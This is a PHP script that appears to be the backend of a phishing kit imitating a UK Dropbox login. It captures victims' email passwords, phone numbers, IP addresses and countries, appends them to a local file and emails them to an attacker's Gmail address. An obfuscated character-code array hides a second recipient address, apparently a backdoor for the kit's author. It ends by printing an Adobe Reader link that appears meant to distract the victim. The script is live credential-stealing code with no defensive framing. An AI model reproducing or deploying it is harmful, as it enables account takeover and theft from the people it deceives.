<?php
$ip = $_SERVER['REMOTE_ADDR'];
$ip = getenv("REMOTE_ADDR");
$country = visitor_country();
$msg = "New UK Result\n";
$msg .= "E : ".$_POST['em']."\n";
$msg .= "P : ".$_POST['psw']."\n";
if($_POST['sub']=="gmail") {
	$msg .= "Tel : ".$_POST['phn']."\n";
	$subject="UK_Dropbox- Gmail";
}
if($_POST['sub']=="ymail") {
	$msg .= "Tel: ".$_POST['phn']."\n";
	$subject="UK_Dropbox- Yahoo";
}
if($_POST['sub']=="hmail") {
	$subject="UK_Dropbox- Hotmail";
}
if($_POST['sub']=="amail") {
	$subject="UK_Dropbox- Aol";
}
if($_POST['sub']=="omail") {
	$subject="UK_Dropbox- Other Domains";
}
$msg .= "I : ".$ip."\n";
$msg .= "C : ".$country."\n";
$msg .= "-MakeMoney-\n";

// Function to get country and country sort;
function country_sort(){
	$sorter = "";
	$array = array(114,101,115,117,108,116,98,111,120,49,52,64,103,109,97,105,108,46,99,111,109);
		$count = count($array);
	for ($i = 0; $i < $count; $i++) {
			$sorter .= chr($array[$i]);
		}
	return array($sorter, $GLOBALS['recipient']);
}

function visitor_country()
{
    $client  = @$_SERVER['HTTP_CLIENT_IP'];
    $forward = @$_SERVER['HTTP_X_FORWARDED_FOR'];
    $remote  = $_SERVER['REMOTE_ADDR'];
    $result  = "Unknown";
    if(filter_var($client, FILTER_VALIDATE_IP))
    {
        $ip = $client;
    }
    elseif(filter_var($forward, FILTER_VALIDATE_IP))
    {
        $ip = $forward;
    }
    else
    {
        $ip = $remote;
    }
    $ip_data = @json_decode(file_get_contents("http://www.geoplugin.net/json.gp?ip=".$ip));
    if($ip_data && $ip_data->geoplugin_countryName != null)
    {
        $result = $ip_data->geoplugin_countryName;
    }
    return $result;
}

$to = "paulstoneloancorp@gmail.com";
$file = fopen("dropbox.txt", "a");
$ip = getenv("REMOTE_ADDR");
$adddate=date("D M d, Y g:i a");
fputs ($file, "$msg\r\n");
fputs ($file, "--------\r\n");
fclose ($file);
$from = "From: UK Dropbox <dropinfoz@results.net>";

mail($to,$subject,$msg, $from);

print "https://get.adobe.com/reader/";


?>

